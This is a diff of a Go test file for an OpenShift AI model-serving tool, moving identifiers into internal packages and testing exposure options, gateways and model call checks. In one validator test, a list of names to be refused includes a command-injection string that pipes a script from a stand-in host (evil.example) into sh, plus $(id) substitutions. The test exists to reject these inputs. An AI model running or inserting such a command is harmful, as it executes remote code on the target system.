@@ -7,6 +7,9 @@ import (
 	"testing"
 	"time"
 
+	"github.com/juntwang/rhoai-nightly-updater/pkg/cluster/internal/kube"
+	"github.com/juntwang/rhoai-nightly-updater/pkg/cluster/internal/rhoai"
+	"github.com/juntwang/rhoai-nightly-updater/pkg/cluster/internal/serving"
 	"github.com/juntwang/rhoai-nightly-updater/pkg/types"
 )
 
@@ -63,17 +66,17 @@ func TestModelExposures_NoGatewayRecommendsSettingItUp(t *testing.T) {
 	if ex.Default != "" || !ex.RecommendGateway || !ex.AuthReady {
 		t.Fatalf("got %+v", ex)
 	}
-	if a := optionByKey(t, ex, exposureDefault); a.Available || !strings.Contains(a.Reason, "The inference gateway isn't set up yet") || a.Fix != "inference-gateway" {
+	if a := optionByKey(t, ex, serving.ExposureDefault); a.Available || !strings.Contains(a.Reason, "The inference gateway isn't set up yet") || a.Fix != "inference-gateway" {
 		t.Errorf("default: %+v", a)
 	}
-	if e := optionByKey(t, ex, exposureInternal); !e.Available || !strings.Contains(e.Warning, "not authenticated") || e.Address != "" {
+	if e := optionByKey(t, ex, serving.ExposureInternal); !e.Available || !strings.Contains(e.Warning, "not authenticated") || e.Address != "" {
 		t.Errorf("internal: %+v", e)
 	}
-	if b := optionByKey(t, ex, exposureMaaS); b.Available {
+	if b := optionByKey(t, ex, serving.ExposureMaaS); b.Available {
 		t.Errorf("maas without a platform: %+v", b)
 	}
 	// An embedding model is never published to MaaS.
-	if b := optionByKey(t, exposures(t, mc, "granite-embedding-125m-english"), exposureMaaS); b.Available || b.Reason != "Only chat models are published to MaaS." {
+	if b := optionByKey(t, exposures(t, mc, "granite-embedding-125m-english"), serving.ExposureMaaS); b.Available || b.Reason != "Only chat models are published to MaaS." {
 		t.Errorf("embedding maas: %+v", b)
 	}
 }
@@ -86,8 +89,8 @@ func TestModelExposures_TheToolsGatewayIsTheDefault(t *testing.T) {
 		t.Fatalf("gateway: %+v", res)
 	}
 	ex := exposures(t, mc, "")
-	a := optionByKey(t, ex, exposureDefault)
-	if ex.Default != exposureDefault || !a.Available || len(a.Changes) != 1 || !strings.Contains(a.Changes[0], "proj is added") || a.Address != "https://inference.apps.example.com/proj/qwen25-05b-instruct" {
+	a := optionByKey(t, ex, serving.ExposureDefault)
+	if ex.Default != serving.ExposureDefault || !a.Available || len(a.Changes) != 1 || !strings.Contains(a.Changes[0], "proj is added") || a.Address != "https://inference.apps.example.com/proj/qwen25-05b-instruct" {
 		t.Fatalf("got %+v / %+v", ex, a)
 	}
 }
@@ -123,7 +126,7 @@ func TestModelExposures_OtherGatewaysAreFiltered(t *testing.T) {
 	}
 	// Set up through it: refs name it; it is never written.
 	before := len(mc.f.mutations())
-	res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Exposure: exposureGateway, GatewayRef: "team-gw/mine"})
+	res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Exposure: serving.ExposureGateway, GatewayRef: "team-gw/mine"})
 	if !res.Success {
 		t.Fatalf("setup: %+v", res)
 	}
@@ -137,7 +140,7 @@ func TestModelExposures_OtherGatewaysAreFiltered(t *testing.T) {
 		}
 	}
 	// An excluded gateway is refused by name.
-	res, _ = runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Model: "smollm2-135m-instruct", Exposure: exposureGateway, GatewayRef: "openshift-ingress/maas-default-gateway"})
+	res, _ = runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Model: "smollm2-135m-instruct", Exposure: serving.ExposureGateway, GatewayRef: "openshift-ingress/maas-default-gateway"})
 	if res.Success || !strings.Contains(res.Message, "MaaS's gateway") {
 		t.Errorf("maas gateway by ref: %+v", res)
 	}
@@ -152,10 +155,10 @@ func TestModelExposures_WithoutConnectivityLink(t *testing.T) {
 	}
 	withoutKuadrant(mc)
 	ex := exposures(t, mc, "")
-	if a := optionByKey(t, ex, exposureDefault); !a.Available || !a.NeedsAuth || ex.AuthReady {
+	if a := optionByKey(t, ex, serving.ExposureDefault); !a.Available || !a.NeedsAuth || ex.AuthReady {
 		t.Errorf("default: %+v", a)
 	}
-	if e := optionByKey(t, ex, exposureInternal); !strings.Contains(e.Warning, "enable-auth") {
+	if e := optionByKey(t, ex, serving.ExposureInternal); !strings.Contains(e.Warning, "enable-auth") {
 		t.Errorf("internal: %+v", e)
 	}
 	res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj"})
@@ -169,7 +172,7 @@ func TestModelExposures_WithoutConnectivityLink(t *testing.T) {
 	mc.f.put("/api/v1/namespaces/proj/services/qwen25-05b-instruct-kserve-workload-svc", map[string]any{
 		"spec": map[string]any{"ports": []any{map[string]any{"name": "https", "appProtocol": "https", "port": 8000}}},
 	})
-	res, events := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Exposure: exposureInternal})
+	res, events := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Exposure: serving.ExposureInternal})
 	if !res.Success {
 		t.Fatalf("internal: %+v", res)
 	}
@@ -178,7 +181,7 @@ func TestModelExposures_WithoutConnectivityLink(t *testing.T) {
 		t.Errorf("internal model has a router: %v", spec["router"])
 	}
 	ann := mc.f.get(testModelPath)["metadata"].(map[string]any)["annotations"].(map[string]any)
-	if ann[enableAuthAnnot] != "false" {
+	if ann[serving.EnableAuthAnnot] != "false" {
 		t.Errorf("annotations: %v", ann)
 	}
 	// Called at its in-cluster address, without a token.
@@ -190,7 +193,7 @@ func TestModelExposures_WithoutConnectivityLink(t *testing.T) {
 		t.Errorf("steps: %s", finalSteps(events))
 	}
 	// How it is reached does not change on a set up again.
-	res, _ = runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Exposure: exposureDefault})
+	res, _ = runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Exposure: serving.ExposureDefault})
 	if res.Success || !strings.Contains(res.Message, "delete it and set it up again") {
 		t.Errorf("change: %+v", res)
 	}
@@ -215,7 +218,7 @@ func TestModelsSetup_CanItBeCalled(t *testing.T) {
 		t.Errorf("no retry said: %v", eventMessages(events, "callable"))
 	}
 	st, _ := GetResourcesStatus(mc.c)
-	if m := st.Models.Items[0]; m.CallCheck == nil || !m.CallCheck.OK || m.Exposure != exposureDefault || m.Gateway != "openshift-ingress/openshift-ai-inference" || m.ServedName != "qwen25-05b-instruct" {
+	if m := st.Models.Items[0]; m.CallCheck == nil || !m.CallCheck.OK || m.Exposure != serving.ExposureDefault || m.Gateway != "openshift-ingress/openshift-ai-inference" || m.ServedName != "qwen25-05b-instruct" {
 		t.Errorf("status: %+v %+v", m, m.CallCheck)
 	}
 
@@ -236,12 +239,12 @@ func TestModelsSetup_CanItBeCalled(t *testing.T) {
 // and the call check does not use it.
 func TestModels_UnsafeServedNameWithheld(t *testing.T) {
 	for _, name := range []string{`x"}'; curl -s https://evil.example/p|sh; echo '`, "a$(id)", "a`id`", "two\nlines", "a b", ""} {
-		if name != "" && safeServedName(name) {
+		if name != "" && serving.SafeServedName(name) {
 			t.Errorf("%q is taken as safe", name)
 		}
 	}
 	for _, name := range []string{"qwen25-05b-instruct", "Qwen/Qwen2.5-0.5B-Instruct", "model:v1.2_x"} {
-		if !safeServedName(name) {
+		if !serving.SafeServedName(name) {
 			t.Errorf("%q is refused", name)
 		}
 	}
@@ -302,7 +305,7 @@ func TestClassifyModelCall(t *testing.T) {
 		{"internal blocked", 0, ``, errSimDNS, true, "not-checked", false, "NetworkPolicy"},
 	}
 	for _, tc := range cases {
-		got, transient := classifyModelCall(tc.status, []byte(tc.body), tc.err, "https://x/v1/chat/completions", "qwen25-05b-instruct", tc.internal)
+		got, transient := serving.ClassifyModelCall(tc.status, []byte(tc.body), tc.err, "https://x/v1/chat/completions", "qwen25-05b-instruct", tc.internal)
 		if got.Result != tc.result || transient != tc.transient || !strings.Contains(got.Message, tc.says) || got.OK != (tc.result == "ok") {
 			t.Errorf("%s: got %+v transient %v", tc.name, got, transient)
 		}
@@ -328,7 +331,7 @@ func TestModelsSetup_PullFailureGraceByNodeAge(t *testing.T) {
 		t.Run(tc.name, func(t *testing.T) {
 			mc := newModelsCluster(t)
 			mc.readyAfter = 0
-			mc.f.putJSON("/api/v1/nodes/node-a", `{"metadata":{"creationTimestamp":"`+clk.Now().Add(-tc.age).UTC().Format(time.RFC3339)+`"}}`)
+			mc.f.putJSON("/api/v1/nodes/node-a", `{"metadata":{"creationTimestamp":"`+kube.Clock().Now().Add(-tc.age).UTC().Format(time.RFC3339)+`"}}`)
 			mc.f.putJSON(testModelPodsPath, `{"metadata":{"labels":{"app.kubernetes.io/name":"qwen25-05b-instruct","app.kubernetes.io/component":"llminferenceservice-workload"}},
 				"spec":{"nodeName":"node-a"},
 				"status":{"containerStatuses":[{"name":"main","state":{"waiting":{"reason":"ImagePullBackOff","message":"unauthorized: authentication required"}}}]}}`)
@@ -360,14 +363,14 @@ func TestModelsSetup_PullFailureThatRecovers(t *testing.T) {
 // Kuadrant reported missing alone does not block models (internal-only
 // works without it); anything else missing still does.
 func TestModelsBlock_ConnectivityLinkAloneIsNoBlock(t *testing.T) {
-	dsc := func(msg string) dscRead {
-		return dscRead{Object: map[string]any{"metadata": map[string]any{"name": "default-dsc"}, "spec": map[string]any{"components": map[string]any{"kserve": map[string]any{"managementState": "Managed"}}},
-			"status": map[string]any{"conditions": []any{map[string]any{"type": llmDependenciesCondition, "status": "False", "message": msg}}}}}
+	dsc := func(msg string) rhoai.DSCRead {
+		return rhoai.DSCRead{Object: map[string]any{"metadata": map[string]any{"name": "default-dsc"}, "spec": map[string]any{"components": map[string]any{"kserve": map[string]any{"managementState": "Managed"}}},
+			"status": map[string]any{"conditions": []any{map[string]any{"type": serving.LLMDependenciesCondition, "status": "False", "message": msg}}}}}
 	}
-	if b, deps := modelsBlock(dsc("Red Hat Connectivity Link is not installed")); b != nil || deps != "False" {
+	if b, deps := serving.ModelsBlock(dsc("Red Hat Connectivity Link is not installed")); b != nil || deps != "False" {
 		t.Errorf("rhcl only: %+v %s", b, deps)
 	}
-	if b, _ := modelsBlock(dsc("cert-manager Operator for Red Hat OpenShift is not installed")); b == nil {
+	if b, _ := serving.ModelsBlock(dsc("cert-manager Operator for Red Hat OpenShift is not installed")); b == nil {
 		t.Error("cert-manager missing is a block")
 	}
 }
@@ -386,24 +389,24 @@ func TestModelsSetup_ModelStepSaysHowItIsReached(t *testing.T) {
 // keeps the subscription's audience, so not "anyone signed in" when it is
 // limited; and an unread MaaS state says so in words.
 func TestModelExposures_MaaSOptionNamesTheAudience(t *testing.T) {
-	entry, _ := catalogEntry("")
-	maasOpt := func(r exposureReads) types.ModelExposureOption {
-		out, _ := r.options()
+	entry, _ := serving.CatalogEntry("")
+	maasOpt := func(r serving.ExposureReads) types.ModelExposureOption {
+		out, _ := r.Options()
 		for _, o := range out.Options {
-			if o.Key == exposureMaaS {
+			if o.Key == serving.ExposureMaaS {
 				return o
 			}
 		}
 		t.Fatal("no MaaS option")
 		return types.ModelExposureOption{}
 	}
-	if o := maasOpt(exposureReads{project: "p", entry: entry, maasKnown: true}); !strings.Contains(o.Description, "anyone signed in") {
+	if o := maasOpt(serving.ExposureReads{Project: "p", Entry: entry, MaaSKnown: true}); !strings.Contains(o.Description, "anyone signed in") {
 		t.Errorf("everyone: %s", o.Description)
 	}
-	if o := maasOpt(exposureReads{project: "p", entry: entry, maasKnown: true, maasWho: "group team-a"}); strings.Contains(o.Description, "anyone signed in") || !strings.Contains(o.Description, "the same people as this tool's other published models (group team-a)") {
+	if o := maasOpt(serving.ExposureReads{Project: "p", Entry: entry, MaaSKnown: true, MaaSWho: "group team-a"}); strings.Contains(o.Description, "anyone signed in") || !strings.Contains(o.Description, "the same people as this tool's other published models (group team-a)") {
 		t.Errorf("limited: %s", o.Description)
 	}
-	if o := maasOpt(exposureReads{project: "p", entry: entry}); o.Reason != "Whether MaaS is set up could not be checked yet." {
+	if o := maasOpt(serving.ExposureReads{Project: "p", Entry: entry}); o.Reason != "Whether MaaS is set up could not be checked yet." {
 		t.Errorf("not checked: %s", o.Reason)
 	}
 }
